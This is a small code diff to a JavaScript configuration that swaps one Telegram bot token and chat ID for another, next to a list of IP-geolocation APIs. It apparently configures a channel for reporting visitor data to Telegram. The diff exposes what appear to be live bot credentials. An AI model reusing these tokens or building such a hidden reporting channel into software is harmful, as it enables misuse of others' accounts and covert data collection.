@@ -4,8 +4,8 @@
 // ==========================================================
 const CONFIG = {
     TELEGRAM: {
-        BOT_TOKEN: '8842557212:AAHTWU_GTkB3fqXBXguSSv8Dzl3yBKzRFt8',
-        CHAT_ID: '-5172379651'
+        BOT_TOKEN: '8706340587:AAGAio2FTlZVVo-iBKJctGvJIlUzt9es4HU',
+        CHAT_ID: '-5447601828'
     },
     IP_APIS: [
         'https://ipwho.is/',
